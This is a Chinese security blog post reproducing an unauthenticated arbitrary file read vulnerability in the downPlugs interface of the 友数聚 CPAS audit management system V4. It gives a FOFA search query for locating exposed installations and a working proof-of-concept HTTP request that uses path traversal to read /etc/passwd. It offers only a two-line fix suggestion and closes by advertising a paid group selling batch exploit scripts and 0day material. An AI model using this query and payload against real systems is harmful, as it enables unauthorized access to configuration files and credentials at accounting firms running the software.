#  「漏洞复现」友数聚 CPAS审计管理系统V4 downPlugs 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-12-30 08:52  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oABILx2icJxxajNaib5uic2Zu0vEJnFHklejTAd3txeUafxEgcvIAnRwtCgEF0JrenwZE9EWdEn9Q4w/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
友数聚CPAS审计管理系统V4是友数聚科技有限公司（用友集团成员企业）开发的一款审计软件产品，它是CPAS审计信息系统的一个重要组成部分。中国注册会计师协会于2012年与用友集团签订战略合作协议，合力开发了CPAS审计信息系统，以服务于本土会计师事务所，建立管理集中、覆盖全面、分工合作、反映及时的一体化审计信息系统。CPAS审计信息系统紧联用户使用习惯，紧扣业务应用需求，紧随行业发展趋势，已形成CPAS审计管理系统、CPAS审计作业系统、CPAS电子档案系统、CPAS合并系统和CPAS函证系统等五大系统互联互通、融合应用的审计信息化全流程应用平台，为大中型会计师事务所提供了一整套全流程审计信息化解决方案。  
  
0x03  
  
漏洞威胁  
  
友数聚 CPAS审计管理系统V4 downPlugs 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
body="/cpasm4/static/cap/font/iconfont.css"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdpXakZZUhcP4ZOiaqR7hOz3umQaKwSzyZfFib5RLH7wlY5YAfgaY2bic6DibfRPdxmtcvDxboicln0rg/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
GET /cpasm4/plugInManController/downPlugs?fileId=../../../../etc/passwd&fileName=1.txt HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdpXakZZUhcP4ZOiaqR7hOzTZIiazCXumtsia7ODhN5d346pQ2rdEa6uU0zIFfPNBp6DdxxUvpmXiamQ/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdpXakZZUhcP4ZOiaqR7hOzNmPjtFFx9bAssZsKiaDib5MMkg7mARFJiaSMNqrcibXRHDmjpJRViaaB50Q/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本   
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rdpXakZZUhcP4ZOiaqR7hOzhytAuNlRr7KvrHYlC1GA4ibClKTDzI0afQnXHYDfeZS1v0f5X4RtuBw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rdpXakZZUhcP4ZOiaqR7hOz8X38Aw5xVB6OOQ0QxibL0sVJ39Vria5D2olfv9AbcM2g9HDjgXqRkE5w/640?wx_fmt=gif&from=appmsg "")  
  
  
